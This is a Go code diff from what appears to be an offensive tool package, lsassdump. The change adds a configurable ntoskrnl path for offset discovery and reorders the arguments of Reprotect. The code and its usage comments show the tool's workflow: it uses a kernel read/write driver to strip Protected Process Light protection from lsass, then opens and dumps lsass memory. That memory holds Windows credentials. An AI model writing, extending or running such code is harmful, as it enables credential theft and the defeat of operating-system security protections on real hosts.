@@ -17,9 +17,18 @@ import (
 // Build is the low dword of the OS build (e.g. 19045 for Win10 22H2).
 // ProtectionOffset is the byte offset of the PS_PROTECTION field
 // inside _EPROCESS.
+//
+// NtoskrnlPath is the kernel image used by Unprotect's
+// auto-discovery fallback when ProtectionOffset is zero. Empty
+// resolves to %SystemRoot%\System32\ntoskrnl.exe via
+// SHGetSpecialFolderPathW. Operators on hosts where the default
+// resolution fails (custom kernel image, locked-down ACL on the
+// SHGet path) can override here; tests inject a known-bad path to
+// exercise the discovery-failure error path.
 type PPLOffsetTable struct {
 	Build            uint32
 	ProtectionOffset uint32
+	NtoskrnlPath     string
 }
 
 // PPLToken captures the lsass EPROCESS VA, the original PS_PROTECTION
@@ -33,7 +42,7 @@ type PPLToken struct {
 }
 
 // IsZero reports whether the token was never populated. Callers can
-// guard cleanup paths with `if !tok.IsZero() { Reprotect(tok, rw) }`.
+// guard cleanup paths with `if !tok.IsZero() { Reprotect(rw, tok) }`.
 func (t PPLToken) IsZero() bool {
 	return t.EProcess == 0 && t.OriginalProtection == 0 && t.ProtectionOffset == 0
 }
@@ -79,7 +88,7 @@ func Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLT
 	}
 	offset := tab.ProtectionOffset
 	if offset == 0 {
-		discovered, err := DiscoverProtectionOffset("")
+		discovered, err := DiscoverProtectionOffset(tab.NtoskrnlPath, nil)
 		if err != nil {
 			return PPLToken{}, fmt.Errorf("%w: auto-discovery failed: %v",
 				ErrInvalidProtectionOffset, err)
@@ -107,17 +116,21 @@ func Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLT
 // Returns nil on the zero token (no-op for the deferred-cleanup
 // idiom).
 //
+// `rw` comes first to match Unprotect(rw, eprocess, tab) and the
+// other kernel-write helpers in this package — the ReadWriter is
+// the most-significant argument.
+//
 // Callers typically:
 //
 //	tok, err := lsassdump.Unprotect(rw, eprocess, tab)
 //	if err != nil { return err }
-//	defer lsassdump.Reprotect(tok, rw)
+//	defer lsassdump.Reprotect(rw, tok)
 //	h, err := lsassdump.OpenLSASS(nil)
 //	...
 //	_, err = lsassdump.Dump(h, w, nil)
 //
 // so the protection byte is restored even on early-return / panic.
-func Reprotect(tok PPLToken, rw driver.ReadWriter) error {
+func Reprotect(rw driver.ReadWriter, tok PPLToken) error {
 	if tok.IsZero() {
 		return nil
 	}
